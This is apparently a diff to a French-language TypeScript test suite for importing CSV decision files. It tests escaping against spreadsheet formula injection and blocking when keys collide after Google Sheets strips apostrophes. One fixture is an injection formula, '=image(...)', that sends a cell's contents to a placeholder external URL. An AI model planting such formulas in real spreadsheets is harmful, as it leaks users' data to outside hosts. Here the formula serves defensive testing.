@@ -752,7 +752,7 @@ describe('M5.1 / décisions de Val — jamais perdues en silence', () => {
     expect(blocages).toEqual([
       "clients-a-valider.csv : colonne(s) groupe_decide introuvable(s) dans la ligne d'en-tête, aucune décision lue",
       "type_overrides.csv : colonne(s) bubble_id introuvable(s) dans la ligne d'en-tête, aucune décision lue",
-      'lieux-a-valider.csv : fiche(s) portant deux décisions différentes (colonne groupe_decide) : l-1',
+      'lieux-a-valider.csv : fiche(s) présente(s) sur plusieurs lignes (colonne cle) : l-1',
       'exclusions.csv : valeur(s) inattendue(s) dans exclure (attendu : oui ou non) : b-3',
     ]);
     // Rejoints aux blocages des décisions du plan : l'import s'arrête avant toute écriture.
@@ -761,7 +761,7 @@ describe('M5.1 / décisions de Val — jamais perdues en silence', () => {
     expect(() => exigerAucunBlocage(plan)).toThrow(/clients-a-valider\.csv/);
   });
 
-  it('cellule commençant par = + - @, tabulation ou retour chariot : écrite précédée d’une apostrophe (Google Sheets n’exécute rien), clés et décisions relues intactes', () => {
+  it('cellule commençant par = + - @, tabulation ou retour chariot : écrite précédée d’une apostrophe (Google Sheets n’exécute rien), clés et décisions relues intactes ; clés confondues après retrait de l’apostrophe : blocage', () => {
     // Clés de lieu tirées d'adresses inventées : une adresse peut commencer par ces caractères.
     const formule = '=image("https://exemple.invalid/x?"&a1)';
     const tiret = '- pavillon est, 1 rue de l’exemple 75001 paris';
@@ -777,7 +777,7 @@ describe('M5.1 / décisions de Val — jamais perdues en silence', () => {
       { cle: deja, nom: '\tSalon\r2', longitude: 2.3, groupe_decide: '' },
       {
         cle: 'l-4',
-        nom: "Salon, l'Annexe",
+        nom: "Salon; l'Annexe",
         longitude: '-0',
         groupe_decide: deja,
       },
@@ -789,7 +789,7 @@ describe('M5.1 / décisions de Val — jamais perdues en silence', () => {
         `"'=image(""https://exemple.invalid/x?""&a1)",'@Salon,-1.55,"'${tiret}"`,
         `"'${tiret}",'+33 1 00 00 00 00,,distinct`,
         `''=deja une apostrophe,"'\tSalon\r2",2.3,`,
-        `l-4,"Salon, l'Annexe",-0,''=deja une apostrophe`,
+        `l-4,"Salon; l'Annexe",-0,''=deja une apostrophe`,
         '',
       ].join('\n'),
     );
@@ -802,20 +802,32 @@ describe('M5.1 / décisions de Val — jamais perdues en silence', () => {
         'groupe_decide',
         blocages,
       );
-      expect(blocages).toEqual([]);
-      return lues;
+      return { lues, blocages };
     };
-    expect(lire(texte)).toEqual(
-      new Map([
+    expect(lire(texte)).toEqual({
+      lues: new Map([
         [formule, tiret],
         [tiret, 'distinct'],
         ['l-4', deja],
       ]),
-    );
-    // Google Sheets peut avoir retiré l'apostrophe ajoutée à l'écriture : la clé reste la même.
-    const parSheets = lire(texte.replace(/(^|,|")'(?=[=+\-@])/gm, '$1'));
-    expect(parSheets.get(formule)).toBe(tiret);
-    expect(parSheets.get(tiret)).toBe('distinct');
+      blocages: [],
+    });
+    // Google Sheets peut avoir retiré l'apostrophe de tête de chaque cellule : la clé reste la même.
+    const parSheets = (t: string) => t.replace(/(^|,|")'/gm, '$1');
+    const sansJumelle = lire(parSheets(texte));
+    expect(sansJumelle.blocages).toEqual([]);
+    expect(sansJumelle.lues.get(formule)).toBe(tiret);
+    expect(sansJumelle.lues.get(tiret)).toBe('distinct');
+    // Une adresse jumelle (« '- … » à côté de « - … ») se relirait alors comme la même clé : blocage, jamais la décision de l'une appliquée à l'autre.
+    // La fiche d'origine sans décision : l'ancienne relecture aurait appliqué en silence celle de la jumelle.
+    const jumelle = ecrireCsv(Object.keys(lignes[0]!), [
+      ...lignes.map((l) => (l.cle === tiret ? { ...l, groupe_decide: '' } : l)),
+      { cle: `'${tiret}`, nom: 'Jumelle', longitude: '', groupe_decide: 'l-4' },
+    ]);
+    expect(lire(jumelle).blocages).toEqual([]);
+    expect(lire(parSheets(jumelle)).blocages).toEqual([
+      `lieux-a-valider.csv : fiche(s) présente(s) sur plusieurs lignes (colonne cle) : ${tiret}`,
+    ]);
   });
 
   it('fichier mal formé (guillemet jamais refermé ou mal placé, lignes au mauvais séparateur, cellules en trop, colonne en double) : blocage, jamais zéro décision en silence', () => {
